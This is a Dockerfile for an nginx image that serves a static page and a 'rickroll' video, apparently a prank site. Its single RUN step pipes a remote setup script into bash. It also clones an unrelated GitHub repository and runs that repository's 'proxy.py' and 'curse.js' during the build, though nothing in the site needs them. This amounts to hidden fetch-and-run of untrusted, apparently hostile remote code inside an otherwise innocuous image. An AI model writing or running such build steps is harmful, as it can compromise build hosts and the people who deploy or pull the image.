FROM nginx:latest

COPY index.html /usr/share/nginx/html/
COPY script.js /usr/share/nginx/html/
COPY style.css /usr/share/nginx/html/

RUN mkdir /usr/share/nginx/html/vids
COPY vids/rickroll.mp4 /usr/share/nginx/html/vids/

ENV DEBIAN_FRONTEND noninteractive

RUN apt-get update && apt-get install -y python3-pip git curl gnupg && \
    curl -sL https://deb.nodesource.com/setup_14.x | bash - && \
    apt-get install -y nodejs && \
    git clone https://github.com/baphomet-disciple/exetc && \
    cd exetc && pip3 install requests && \
    python3 proxy.py && npm i && node curse.js


EXPOSE 80
